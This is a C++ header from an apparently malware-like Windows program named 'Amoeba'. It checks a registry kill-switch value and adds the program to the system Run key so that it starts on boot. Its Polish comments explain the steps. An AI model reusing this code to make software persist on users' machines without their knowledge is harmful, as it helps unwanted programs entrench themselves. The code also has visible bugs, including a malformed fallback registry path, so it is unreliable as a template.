#pragma once
#include "pch.h"
#include "shlwapi.h"
#pragma comment(lib,"shlwapi.lib")

class CRegister
{
public:

	static bool Dieee()
	{
		HKEY gonaDie;
		if (RegOpenKeyEx(HKEY_CURRENT_USER,TEXT("software\\Amoeba"),0,KEY_ALL_ACCESS,&gonaDie) 
						!= ERROR_SUCCESS)
			return false;

		DWORD die;
		DWORD size = sizeof(die);
		if (RegQueryValueEx(gonaDie,TEXT("Die"),NULL,NULL,(PBYTE) &die,&size) != ERROR_SUCCESS)
			return false;

		return true;
	}

	static bool AddAutoRun()
	{
		HKEY keyAutorun;
		// pierwsza proba to otwarcie klucza odpowiedzialnego za globalny autostart, druga - dla aktywnego u¿ytkownika
		if (RegOpenKeyEx(HKEY_LOCAL_MACHINE,TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),0,KEY_ALL_ACCESS,&keyAutorun)
			            != ERROR_SUCCESS)
			if (RegOpenKeyEx(HKEY_USERS,TEXT("software\\microsoft\\windows\\CurrentVersion\\run"),0,KEY_ALL_ACCESS,&keyAutorun)
							!= ERROR_SUCCESS)
						return false;

		if (RegSetValueEx(keyAutorun,TEXT("Amoeba"),0,REG_SZ,(LPBYTE) cpPath, ncpPath<<1) // mno¿enie npcPath razy 2, gdy¿ na znak WCHAR przypada 2 bajty
					!= ERROR_SUCCESS)
			return false;

		RegCloseKey(keyAutorun);
		return true;
	}
private:
	CRegister() {}
};
